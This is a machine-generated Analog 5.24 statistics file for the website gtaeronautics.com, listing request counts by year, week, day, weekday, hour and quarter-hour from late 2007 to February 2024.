x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	02	16	02	08
x	FR	2007	12	18	17	05
x	LR	2024	02	15	05	58
x	E7	2024	02	16	02	08
x	SR	1706440
x	S7	8778
x	NC	599604
x	C7	0
x	FL	635307
x	F7	415
x	RR	254
x	R7	0
x	NH	109723
x	H7	381
x	BT	57520368399
x	B7	0
1	Rr	102234	5.991	2024
1	Rr	511208	29.958	2023
1	Rr	82334	4.825	2022
1	Rr	98917	5.797	2021
1	Rr	89380	5.238	2020
1	Rr	80088	4.693	2019
1	Rr	68927	4.039	2018
1	Rr	60168	3.526	2017
1	Rr	73316	4.296	2016
1	Rr	80796	4.735	2015
1	Rr	110773	6.491	2014
1	Rr	65173	3.819	2013
1	Rr	60742	3.560	2012
1	Rr	57015	3.341	2011
1	Rr	22139	1.297	2010
1	Rr	69710	4.085	2009
1	Rr	71820	4.209	2008
1	Rr	1700	0.100	2007
1	*BT	R	511208	2023
W	Rr	1347	0.079	2016	03	13
W	Rr	1347	0.079	2016	03	06
W	Rr	1236	0.072	2016	02	28
W	Rr	1422	0.083	2016	02	21
W	Rr	1085	0.064	2016	02	14
W	Rr	1427	0.084	2016	02	07
W	Rr	1359	0.080	2016	01	31
W	Rr	1708	0.100	2016	01	24
W	Rr	1476	0.086	2016	01	17
W	Rr	1563	0.092	2016	01	10
W	Rr	1381	0.081	2016	01	03
W	Rr	1273	0.075	2015	12	27
W	Rr	1084	0.064	2015	12	20
W	Rr	1344	0.079	2015	12	13
W	Rr	1336	0.078	2015	12	06
W	Rr	1123	0.066	2015	11	29
W	Rr	960	0.056	2015	11	22
W	Rr	1337	0.078	2015	11	15
W	Rr	1400	0.082	2015	11	08
W	Rr	1383	0.081	2015	11	01
W	Rr	1250	0.073	2015	10	25
W	Rr	1366	0.080	2015	10	18
W	Rr	1367	0.080	2015	10	11
W	Rr	1214	0.071	2015	10	04
W	Rr	1152	0.068	2015	09	27
W	Rr	1387	0.081	2015	09	20
W	Rr	1655	0.097	2015	09	13
W	Rr	1526	0.089	2015	09	06
W	Rr	1242	0.073	2015	08	30
W	Rr	1800	0.105	2015	08	23
W	Rr	1527	0.089	2015	08	16
W	Rr	1386	0.081	2015	08	09
W	Rr	1593	0.093	2015	08	02
W	Rr	1567	0.092	2015	07	26
W	Rr	1980	0.116	2015	07	19
W	Rr	2180	0.128	2015	07	12
W	Rr	2008	0.118	2015	07	05
W	Rr	2297	0.135	2015	06	28
W	Rr	1556	0.091	2015	06	21
W	Rr	1380	0.081	2015	06	14
W	Rr	2013	0.118	2015	06	07
W	Rr	1651	0.097	2015	05	31
W	Rr	1224	0.072	2015	05	24
W	Rr	1355	0.079	2015	05	17
W	Rr	1179	0.069	2015	05	10
W	Rr	1436	0.084	2015	05	03
W	Rr	1671	0.098	2015	04	26
W	Rr	1878	0.110	2015	04	19
W	Rr	2326	0.136	2015	04	12
W	Rr	2636	0.154	2015	04	05
W	Rr	2297	0.135	2015	03	29
W	Rr	1237	0.072	2015	03	22
W	Rr	1453	0.085	2015	03	15
W	Rr	1399	0.082	2015	03	08
W	Rr	1287	0.075	2015	03	01
W	Rr	1249	0.073	2015	02	22
W	Rr	1373	0.080	2015	02	15
W	Rr	1790	0.105	2015	02	08
W	Rr	1672	0.098	2015	02	01
W	Rr	1543	0.090	2015	01	25
W	Rr	1463	0.086	2015	01	18
W	Rr	1696	0.099	2015	01	11
W	Rr	1707	0.100	2015	01	04
W	Rr	1833	0.107	2014	12	28
W	Rr	1335	0.078	2014	12	21
W	Rr	1644	0.096	2014	12	14
W	Rr	1541	0.090	2014	12	07
W	Rr	1335	0.078	2014	11	30
W	Rr	1262	0.074	2014	11	23
W	Rr	2009	0.118	2014	11	16
W	Rr	1566	0.092	2014	11	09
W	Rr	1814	0.106	2014	11	02
W	Rr	1452	0.085	2014	10	26
W	Rr	1642	0.096	2014	10	19
W	Rr	1795	0.105	2014	10	12
W	Rr	1836	0.108	2014	10	05
W	Rr	1662	0.097	2014	09	28
W	Rr	1843	0.108	2014	09	21
W	Rr	1678	0.098	2014	09	14
W	Rr	1598	0.094	2014	09	07
W	Rr	1418	0.083	2014	08	31
W	Rr	1584	0.093	2014	08	24
W	Rr	1571	0.092	2014	08	17
W	Rr	1727	0.101	2014	08	10
W	Rr	1927	0.113	2014	08	03
W	Rr	1691	0.099	2014	07	27
W	Rr	1702	0.100	2014	07	20
W	Rr	1624	0.095	2014	07	13
W	Rr	1831	0.107	2014	07	06
W	Rr	1867	0.109	2014	06	29
W	Rr	1927	0.113	2014	06	22
W	Rr	2134	0.125	2014	06	15
W	Rr	4851	0.284	2014	06	08
W	Rr	2293	0.134	2014	06	01
W	Rr	3180	0.186	2014	05	25
W	Rr	1468	0.086	2014	05	18
W	Rr	1808	0.106	2014	05	11
W	Rr	1998	0.117	2014	05	04
W	Rr	1876	0.110	2014	04	27
W	Rr	2330	0.137	2014	04	20
W	Rr	2565	0.150	2014	04	13
W	Rr	2652	0.155	2014	04	06
W	Rr	2574	0.151	2014	03	30
W	Rr	1186	0.070	2014	03	23
W	Rr	1305	0.076	2014	03	16
W	Rr	2273	0.133	2014	03	09
W	Rr	2231	0.131	2014	03	02
W	Rr	1925	0.113	2014	02	23
W	Rr	7060	0.414	2014	02	16
W	Rr	2854	0.167	2014	02	09
W	Rr	3190	0.187	2014	02	02
W	Rr	3743	0.219	2014	01	26
W	Rr	3643	0.213	2014	01	19
W	Rr	2961	0.174	2014	01	12
W	Rr	2319	0.136	2014	01	05
W	Rr	981	0.057	2013	12	29
W	Rr	1108	0.065	2013	12	22
W	Rr	1226	0.072	2013	12	15
W	Rr	1285	0.075	2013	12	08
W	Rr	1289	0.076	2013	12	01
W	Rr	1404	0.082	2013	11	24
W	Rr	1142	0.067	2013	11	17
W	Rr	1334	0.078	2013	11	10
W	Rr	1277	0.075	2013	11	03
W	Rr	1035	0.061	2013	10	27
W	Rr	1309	0.077	2013	10	20
W	Rr	1302	0.076	2013	10	13
W	Rr	1432	0.084	2013	10	06
W	Rr	1178	0.069	2013	09	29
W	Rr	947	0.055	2013	09	22
W	Rr	1254	0.073	2013	09	15
W	Rr	1099	0.064	2013	09	08
W	Rr	1053	0.062	2013	09	01
W	Rr	1010	0.059	2013	08	25
W	Rr	1102	0.065	2013	08	18
W	Rr	1063	0.062	2013	08	11
W	Rr	1105	0.065	2013	08	04
W	Rr	1377	0.081	2013	07	28
W	Rr	1498	0.088	2013	07	21
W	Rr	1295	0.076	2013	07	14
W	Rr	1237	0.072	2013	07	07
W	Rr	1003	0.059	2013	06	30
W	Rr	1275	0.075	2013	06	23
W	Rr	1072	0.063	2013	06	16
W	Rr	1249	0.073	2013	06	09
W	Rr	1521	0.089	2013	06	02
W	Rr	1256	0.074	2013	05	26
W	Rr	1091	0.064	2013	05	19
W	Rr	1359	0.080	2013	05	12
W	Rr	1130	0.066	2013	05	05
W	Rr	1215	0.071	2013	04	28
W	Rr	1368	0.080	2013	04	21
W	Rr	1318	0.077	2013	04	14
W	Rr	1408	0.083	2013	04	07
W	Rr	1277	0.075	2013	03	31
W	Rr	1452	0.085	2013	03	24
W	Rr	1418	0.083	2013	03	17
W	Rr	1217	0.071	2013	03	10
W	Rr	1490	0.087	2013	03	03
W	Rr	1353	0.079	2013	02	24
W	Rr	1268	0.074	2013	02	17
W	Rr	1274	0.075	2013	02	10
W	Rr	1153	0.068	2013	02	03
W	Rr	1266	0.074	2013	01	27
W	Rr	1271	0.074	2013	01	20
W	Rr	1449	0.085	2013	01	13
W	Rr	1253	0.073	2013	01	06
W	Rr	1309	0.077	2012	12	30
W	Rr	1156	0.068	2012	12	23
W	Rr	1336	0.078	2012	12	16
W	Rr	1575	0.092	2012	12	09
W	Rr	1087	0.064	2012	12	02
W	Rr	1376	0.081	2012	11	25
W	Rr	1136	0.067	2012	11	18
W	Rr	1341	0.079	2012	11	11
W	Rr	1418	0.083	2012	11	04
W	Rr	1103	0.065	2012	10	28
W	Rr	1200	0.070	2012	10	21
W	Rr	1382	0.081	2012	10	14
W	Rr	1127	0.066	2012	10	07
W	Rr	1187	0.070	2012	09	30
W	Rr	1172	0.069	2012	09	23
W	Rr	1034	0.061	2012	09	16
W	Rr	944	0.055	2012	09	09
W	Rr	958	0.056	2012	09	02
W	Rr	734	0.043	2012	08	26
W	Rr	881	0.052	2012	08	19
W	Rr	874	0.051	2012	08	12
W	Rr	973	0.057	2012	08	05
W	Rr	1010	0.059	2012	07	29
W	Rr	943	0.055	2012	07	22
W	Rr	1089	0.064	2012	07	15
W	Rr	888	0.052	2012	07	08
W	Rr	845	0.050	2012	07	01
W	Rr	1070	0.063	2012	06	24
W	Rr	1050	0.062	2012	06	17
W	Rr	1271	0.074	2012	06	10
W	Rr	957	0.056	2012	06	03
W	Rr	1249	0.073	2012	05	27
W	Rr	1055	0.062	2012	05	20
W	Rr	1392	0.082	2012	05	13
W	Rr	1140	0.067	2012	05	06
W	Rr	1807	0.106	2012	04	29
W	Rr	1225	0.072	2012	04	22
W	Rr	1264	0.074	2012	04	15
W	Rr	1075	0.063	2012	04	08
W	Rr	1261	0.074	2012	04	01
W	Rr	1345	0.079	2012	03	25
W	Rr	1254	0.073	2012	03	18
W	Rr	1478	0.087	2012	03	11
W	Rr	1503	0.088	2012	03	04
W	Rr	1532	0.090	2012	02	26
W	Rr	1464	0.086	2012	02	19
W	Rr	1154	0.068	2012	02	12
W	Rr	1240	0.073	2012	02	05
W	Rr	1088	0.064	2012	01	29
W	Rr	1125	0.066	2012	01	22
W	Rr	60	0.004	2012	01	15
W	Rr	1472	0.086	2012	01	08
W	Rr	1122	0.066	2012	01	01
W	Rr	888	0.052	2011	12	25
W	Rr	1360	0.080	2011	12	18
W	Rr	1486	0.087	2011	12	11
W	Rr	1330	0.078	2011	12	04
W	Rr	1094	0.064	2011	11	27
W	Rr	1062	0.062	2011	11	20
W	Rr	1123	0.066	2011	11	13
W	Rr	975	0.057	2011	11	06
W	Rr	1264	0.074	2011	10	30
W	Rr	1140	0.067	2011	10	23
W	Rr	1211	0.071	2011	10	16
W	Rr	1236	0.072	2011	10	09
W	Rr	1128	0.066	2011	10	02
W	Rr	1083	0.063	2011	09	25
W	Rr	1451	0.085	2011	09	18
W	Rr	1278	0.075	2011	09	11
W	Rr	1219	0.071	2011	09	04
W	Rr	1316	0.077	2011	08	28
W	Rr	1119	0.066	2011	08	21
W	Rr	1484	0.087	2011	08	14
W	Rr	1671	0.098	2011	08	07
W	Rr	1319	0.077	2011	07	31
W	Rr	1197	0.070	2011	07	24
W	Rr	1504	0.088	2011	07	17
W	Rr	1367	0.080	2011	07	10
W	Rr	1205	0.071	2011	07	03
W	Rr	1333	0.078	2011	06	26
W	Rr	1059	0.062	2011	06	19
W	Rr	1353	0.079	2011	06	12
W	Rr	1275	0.075	2011	06	05
W	Rr	983	0.058	2011	05	29
W	Rr	1262	0.074	2011	05	22
W	Rr	1374	0.081	2011	05	15
W	Rr	1076	0.063	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.001	2011	03	20
W	Rr	1317	0.077	2011	03	13
W	Rr	1258	0.074	2011	03	06
W	Rr	1372	0.080	2011	02	27
W	Rr	1226	0.072	2011	02	20
W	Rr	1524	0.089	2011	02	13
W	Rr	1366	0.080	2011	02	06
W	Rr	958	0.056	2011	01	30
W	Rr	1273	0.075	2011	01	23
W	Rr	1560	0.091	2011	01	16
W	Rr	1472	0.086	2011	01	09
W	Rr	1310	0.077	2011	01	02
W	Rr	798	0.047	2010	12	26
W	Rr	935	0.055	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.054	2010	06	20
W	Rr	1104	0.065	2010	06	13
W	Rr	1096	0.064	2010	06	06
W	Rr	1171	0.069	2010	05	30
W	Rr	1115	0.065	2010	05	23
W	Rr	1170	0.069	2010	05	16
W	Rr	1334	0.078	2010	05	09
W	Rr	1109	0.065	2010	05	02
W	Rr	1067	0.063	2010	04	25
W	Rr	1212	0.071	2010	04	18
W	Rr	1054	0.062	2010	04	11
W	Rr	1325	0.078	2010	04	04
W	Rr	811	0.048	2010	03	28
W	Rr	1195	0.070	2010	03	21
W	Rr	1338	0.078	2010	03	14
W	Rr	1113	0.065	2010	03	07
W	Rr	1103	0.065	2010	02	28
W	Rr	1290	0.076	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.005	2009	12	27
W	Rr	945	0.055	2009	12	20
W	Rr	1140	0.067	2009	12	13
W	Rr	1323	0.078	2009	12	06
W	Rr	1518	0.089	2009	11	29
W	Rr	1352	0.079	2009	11	22
W	Rr	1346	0.079	2009	11	15
W	Rr	1416	0.083	2009	11	08
W	Rr	1734	0.102	2009	11	01
W	Rr	1035	0.061	2009	10	25
W	Rr	1297	0.076	2009	10	18
W	Rr	1267	0.074	2009	10	11
W	Rr	1440	0.084	2009	10	04
W	Rr	1521	0.089	2009	09	27
W	Rr	1121	0.066	2009	09	20
W	Rr	875	0.051	2009	09	13
W	Rr	1032	0.060	2009	09	06
W	Rr	1283	0.075	2009	08	30
W	Rr	1214	0.071	2009	08	23
W	Rr	1402	0.082	2009	08	16
W	Rr	1260	0.074	2009	08	09
W	Rr	1404	0.082	2009	08	02
W	Rr	1380	0.081	2009	07	26
W	Rr	1470	0.086	2009	07	19
W	Rr	1750	0.103	2009	07	12
W	Rr	1847	0.108	2009	07	05
W	Rr	1889	0.111	2009	06	28
W	Rr	1312	0.077	2009	06	21
W	Rr	1093	0.064	2009	06	14
W	Rr	1363	0.080	2009	06	07
W	Rr	1251	0.073	2009	05	31
W	Rr	1352	0.079	2009	05	24
W	Rr	1133	0.066	2009	05	17
W	Rr	1887	0.111	2009	05	10
W	Rr	1369	0.080	2009	05	03
W	Rr	1089	0.064	2009	04	26
W	Rr	1160	0.068	2009	04	19
W	Rr	1189	0.070	2009	04	12
W	Rr	1529	0.090	2009	04	05
W	Rr	1155	0.068	2009	03	29
W	Rr	1230	0.072	2009	03	22
W	Rr	1029	0.060	2009	03	15
W	Rr	1234	0.072	2009	03	08
W	Rr	1486	0.087	2009	03	01
W	Rr	1470	0.086	2009	02	22
W	Rr	1198	0.070	2009	02	15
W	Rr	1802	0.106	2009	02	08
W	Rr	1653	0.097	2009	02	01
W	Rr	1346	0.079	2009	01	25
W	Rr	1431	0.084	2009	01	18
W	Rr	1678	0.098	2009	01	11
W	Rr	1591	0.093	2009	01	04
W	Rr	886	0.052	2008	12	28
W	Rr	1148	0.067	2008	12	21
W	Rr	1428	0.084	2008	12	14
W	Rr	1508	0.088	2008	12	07
W	Rr	1194	0.070	2008	11	30
W	Rr	1070	0.063	2008	11	23
W	Rr	1396	0.082	2008	11	16
W	Rr	1255	0.074	2008	11	09
W	Rr	1314	0.077	2008	11	02
W	Rr	1397	0.082	2008	10	26
W	Rr	1638	0.096	2008	10	19
W	Rr	1298	0.076	2008	10	12
W	Rr	430	0.025	2008	10	05
W	Rr	723	0.042	2008	09	28
W	Rr	1308	0.077	2008	09	21
W	Rr	1242	0.073	2008	09	14
W	Rr	1409	0.083	2008	09	07
W	Rr	1142	0.067	2008	08	31
W	Rr	1022	0.060	2008	08	24
W	Rr	1062	0.062	2008	08	17
W	Rr	1188	0.070	2008	08	10
W	Rr	1232	0.072	2008	08	03
W	Rr	1050	0.062	2008	07	27
W	Rr	1272	0.075	2008	07	20
W	Rr	1305	0.076	2008	07	13
W	Rr	1093	0.064	2008	07	06
W	Rr	1182	0.069	2008	06	29
W	Rr	1937	0.114	2008	06	22
W	Rr	1493	0.087	2008	06	15
W	Rr	1083	0.063	2008	06	08
W	Rr	1283	0.075	2008	06	01
W	Rr	1432	0.084	2008	05	25
W	Rr	1726	0.101	2008	05	18
W	Rr	1580	0.093	2008	05	11
W	Rr	2661	0.156	2008	05	04
W	Rr	3648	0.214	2008	04	27
W	Rr	1400	0.082	2008	04	20
W	Rr	1365	0.080	2008	04	13
W	Rr	1213	0.071	2008	04	06
W	Rr	1670	0.098	2008	03	30
W	Rr	1211	0.071	2008	03	23
W	Rr	1144	0.067	2008	03	16
W	Rr	1301	0.076	2008	03	09
W	Rr	1292	0.076	2008	03	02
W	Rr	1427	0.084	2008	02	24
W	Rr	2207	0.129	2008	02	17
W	Rr	1124	0.066	2008	02	10
W	Rr	1561	0.091	2008	02	03
W	Rr	1533	0.090	2008	01	27
W	Rr	1389	0.081	2008	01	20
W	Rr	1133	0.066	2008	01	13
W	Rr	1404	0.082	2008	01	06
W	Rr	976	0.057	2007	12	30
W	Rr	801	0.047	2007	12	23
W	Rr	675	0.040	2007	12	16
W	*BT	R	26220	2024	01	28
D	Rr	107	0.006	2024	02	15
D	Rr	448	0.026	2024	02	14
D	Rr	525	0.031	2024	02	13
D	Rr	2139	0.125	2024	02	12
D	Rr	1353	0.079	2024	02	11
D	Rr	1260	0.074	2024	02	10
D	Rr	3204	0.188	2024	02	09
D	Rr	2214	0.130	2024	02	08
D	Rr	1884	0.110	2024	02	07
D	Rr	2688	0.158	2024	02	06
D	Rr	2472	0.145	2024	02	05
D	Rr	3138	0.184	2024	02	04
D	Rr	2478	0.145	2024	02	03
D	Rr	1632	0.096	2024	02	02
D	Rr	2634	0.154	2024	02	01
D	Rr	2976	0.174	2024	01	31
D	Rr	4860	0.285	2024	01	30
D	Rr	9912	0.581	2024	01	29
D	Rr	1728	0.101	2024	01	28
D	Rr	1752	0.103	2024	01	27
D	Rr	1380	0.081	2024	01	26
D	Rr	2742	0.161	2024	01	25
D	Rr	2958	0.173	2024	01	24
D	Rr	2466	0.145	2024	01	23
D	Rr	1902	0.111	2024	01	22
D	Rr	1530	0.090	2024	01	21
D	Rr	1194	0.070	2024	01	20
D	Rr	1446	0.085	2024	01	19
D	Rr	1902	0.111	2024	01	18
D	Rr	2124	0.124	2024	01	17
D	Rr	1632	0.096	2024	01	16
D	Rr	1800	0.105	2024	01	15
D	Rr	3000	0.176	2024	01	14
D	Rr	1842	0.108	2024	01	13
D	Rr	2844	0.167	2024	01	12
D	Rr	1596	0.094	2024	01	11
D	Rr	2184	0.128	2024	01	10
D	Rr	2460	0.144	2024	01	09
D	Rr	2712	0.159	2024	01	08
D	Rr	1686	0.099	2024	01	07
D	Rr	1374	0.081	2024	01	06
D	Rr	1218	0.071	2024	01	05
D	*BT	R	9912	2024	01	29
d	Rr	202798	11.884	Sun
d	Rr	278199	16.303	Mon
d	Rr	274479	16.085	Tue
d	Rr	279159	16.359	Wed
d	Rr	270084	15.827	Thu
d	Rr	255903	14.996	Fri
d	Rr	145818	8.545	Sat
H	Rr	5	0.000	2024	02	15	05
H	Rr	7	0.000	2024	02	15	04
H	Rr	38	0.002	2024	02	15	03
H	Rr	10	0.001	2024	02	15	02
H	Rr	37	0.002	2024	02	15	01
H	Rr	10	0.001	2024	02	15	00
H	Rr	25	0.001	2024	02	14	23
H	Rr	83	0.005	2024	02	14	22
H	Rr	5	0.000	2024	02	14	21
H	Rr	11	0.001	2024	02	14	20
H	Rr	11	0.001	2024	02	14	19
H	Rr	7	0.000	2024	02	14	18
H	Rr	2	0.000	2024	02	14	17
H	Rr	5	0.000	2024	02	14	16
H	Rr	4	0.000	2024	02	14	15
H	Rr	3	0.000	2024	02	14	14
H	Rr	2	0.000	2024	02	14	13
H	Rr	7	0.000	2024	02	14	12
H	Rr	8	0.000	2024	02	14	11
H	Rr	86	0.005	2024	02	14	10
H	Rr	1	0.000	2024	02	14	09
H	Rr	2	0.000	2024	02	14	08
H	Rr	4	0.000	2024	02	14	07
H	Rr	126	0.007	2024	02	14	06
H	Rr	24	0.001	2024	02	14	05
H	Rr	14	0.001	2024	02	14	04
H	Rr	10	0.001	2024	02	14	03
H	Rr	4	0.000	2024	02	14	02
H	Rr	4	0.000	2024	02	14	01
H	Rr	0	0.000	2024	02	14	00
H	Rr	8	0.000	2024	02	13	23
H	Rr	12	0.001	2024	02	13	22
H	Rr	0	0.000	2024	02	13	21
H	Rr	8	0.000	2024	02	13	20
H	Rr	20	0.001	2024	02	13	19
H	Rr	6	0.000	2024	02	13	18
H	Rr	20	0.001	2024	02	13	17
H	Rr	10	0.001	2024	02	13	16
H	Rr	8	0.000	2024	02	13	15
H	Rr	170	0.010	2024	02	13	14
H	Rr	12	0.001	2024	02	13	13
H	Rr	12	0.001	2024	02	13	12
H	Rr	12	0.001	2024	02	13	11
H	Rr	4	0.000	2024	02	13	10
H	Rr	34	0.002	2024	02	13	09
H	Rr	14	0.001	2024	02	13	08
H	Rr	14	0.001	2024	02	13	07
H	Rr	2	0.000	2024	02	13	06
H	Rr	9	0.001	2024	02	13	05
H	Rr	9	0.001	2024	02	13	04
H	Rr	99	0.006	2024	02	13	03
H	Rr	12	0.001	2024	02	13	02
H	Rr	15	0.001	2024	02	13	01
H	Rr	15	0.001	2024	02	13	00
H	Rr	99	0.006	2024	02	12	23
H	Rr	102	0.006	2024	02	12	22
H	Rr	3	0.000	2024	02	12	21
H	Rr	102	0.006	2024	02	12	20
H	Rr	39	0.002	2024	02	12	19
H	Rr	0	0.000	2024	02	12	18
H	Rr	138	0.008	2024	02	12	17
H	Rr	114	0.007	2024	02	12	16
H	Rr	105	0.006	2024	02	12	15
H	Rr	540	0.032	2024	02	12	14
H	Rr	513	0.030	2024	02	12	13
H	Rr	15	0.001	2024	02	12	12
H	Rr	9	0.001	2024	02	12	11
H	Rr	3	0.000	2024	02	12	10
H	Rr	9	0.001	2024	02	12	09
H	Rr	18	0.001	2024	02	12	08
H	Rr	24	0.001	2024	02	12	07
H	Rr	18	0.001	2024	02	12	06
H	*BT	R	1638	2024	01	29	20
h	Rr	66428	3.893	00
h	Rr	64159	3.760	01
h	Rr	65207	3.821	02
h	Rr	66080	3.872	03
h	Rr	65030	3.811	04
h	Rr	62451	3.660	05
h	Rr	59070	3.462	06
h	Rr	58883	3.451	07
h	Rr	55663	3.262	08
h	Rr	51958	3.045	09
h	Rr	56718	3.324	10
h	Rr	59863	3.508	11
h	Rr	59038	3.460	12
h	Rr	64781	3.796	13
h	Rr	79794	4.676	14
h	Rr	84560	4.955	15
h	Rr	93217	5.463	16
h	Rr	94888	5.561	17
h	Rr	94197	5.520	18
h	Rr	91013	5.334	19
h	Rr	88262	5.172	20
h	Rr	82574	4.839	21
h	Rr	72002	4.219	22
h	Rr	70604	4.138	23
4	Rr	2	0.000	2024	02	15	05	45
4	Rr	1	0.000	2024	02	15	05	30
4	Rr	1	0.000	2024	02	15	05	15
4	Rr	1	0.000	2024	02	15	05	00
4	Rr	1	0.000	2024	02	15	04	45
4	Rr	0	0.000	2024	02	15	04	30
4	Rr	3	0.000	2024	02	15	04	15
4	Rr	3	0.000	2024	02	15	04	00
4	Rr	33	0.002	2024	02	15	03	45
4	Rr	1	0.000	2024	02	15	03	30
4	Rr	1	0.000	2024	02	15	03	15
4	Rr	3	0.000	2024	02	15	03	00
4	Rr	2	0.000	2024	02	15	02	45
4	Rr	3	0.000	2024	02	15	02	30
4	Rr	1	0.000	2024	02	15	02	15
4	Rr	4	0.000	2024	02	15	02	00
4	Rr	32	0.002	2024	02	15	01	45
4	Rr	2	0.000	2024	02	15	01	30
4	Rr	1	0.000	2024	02	15	01	15
4	Rr	2	0.000	2024	02	15	01	00
4	Rr	4	0.000	2024	02	15	00	45
4	Rr	1	0.000	2024	02	15	00	30
4	Rr	5	0.000	2024	02	15	00	15
4	Rr	0	0.000	2024	02	15	00	00
4	Rr	1	0.000	2024	02	14	23	45
4	Rr	1	0.000	2024	02	14	23	30
4	Rr	0	0.000	2024	02	14	23	15
4	Rr	23	0.001	2024	02	14	23	00
4	Rr	9	0.001	2024	02	14	22	45
4	Rr	73	0.004	2024	02	14	22	30
4	Rr	1	0.000	2024	02	14	22	15
4	Rr	0	0.000	2024	02	14	22	00
4	Rr	1	0.000	2024	02	14	21	45
4	Rr	1	0.000	2024	02	14	21	30
4	Rr	2	0.000	2024	02	14	21	15
4	Rr	1	0.000	2024	02	14	21	00
4	Rr	3	0.000	2024	02	14	20	45
4	Rr	0	0.000	2024	02	14	20	30
4	Rr	2	0.000	2024	02	14	20	15
4	Rr	6	0.000	2024	02	14	20	00
4	Rr	4	0.000	2024	02	14	19	45
4	Rr	3	0.000	2024	02	14	19	30
4	Rr	2	0.000	2024	02	14	19	15
4	Rr	2	0.000	2024	02	14	19	00
4	Rr	2	0.000	2024	02	14	18	45
4	Rr	4	0.000	2024	02	14	18	30
4	Rr	1	0.000	2024	02	14	18	15
4	Rr	0	0.000	2024	02	14	18	00
4	Rr	1	0.000	2024	02	14	17	45
4	Rr	0	0.000	2024	02	14	17	30
4	Rr	0	0.000	2024	02	14	17	15
4	Rr	1	0.000	2024	02	14	17	00
4	Rr	0	0.000	2024	02	14	16	45
4	Rr	0	0.000	2024	02	14	16	30
4	Rr	3	0.000	2024	02	14	16	15
4	Rr	2	0.000	2024	02	14	16	00
4	Rr	4	0.000	2024	02	14	15	45
4	Rr	0	0.000	2024	02	14	15	30
4	Rr	0	0.000	2024	02	14	15	15
4	Rr	0	0.000	2024	02	14	15	00
4	Rr	1	0.000	2024	02	14	14	45
4	Rr	0	0.000	2024	02	14	14	30
4	Rr	0	0.000	2024	02	14	14	15
4	Rr	2	0.000	2024	02	14	14	00
4	Rr	0	0.000	2024	02	14	13	45
4	Rr	0	0.000	2024	02	14	13	30
4	Rr	2	0.000	2024	02	14	13	15
4	Rr	0	0.000	2024	02	14	13	00
4	Rr	0	0.000	2024	02	14	12	45
4	Rr	1	0.000	2024	02	14	12	30
4	Rr	4	0.000	2024	02	14	12	15
4	Rr	2	0.000	2024	02	14	12	00
4	Rr	0	0.000	2024	02	14	11	45
4	Rr	2	0.000	2024	02	14	11	30
4	Rr	1	0.000	2024	02	14	11	15
4	Rr	5	0.000	2024	02	14	11	00
4	Rr	0	0.000	2024	02	14	10	45
4	Rr	0	0.000	2024	02	14	10	30
4	Rr	0	0.000	2024	02	14	10	15
4	Rr	86	0.005	2024	02	14	10	00
4	Rr	0	0.000	2024	02	14	09	45
4	Rr	1	0.000	2024	02	14	09	30
4	Rr	0	0.000	2024	02	14	09	15
4	Rr	0	0.000	2024	02	14	09	00
4	Rr	0	0.000	2024	02	14	08	45
4	Rr	0	0.000	2024	02	14	08	30
4	Rr	0	0.000	2024	02	14	08	15
4	Rr	2	0.000	2024	02	14	08	00
4	Rr	0	0.000	2024	02	14	07	45
4	Rr	2	0.000	2024	02	14	07	30
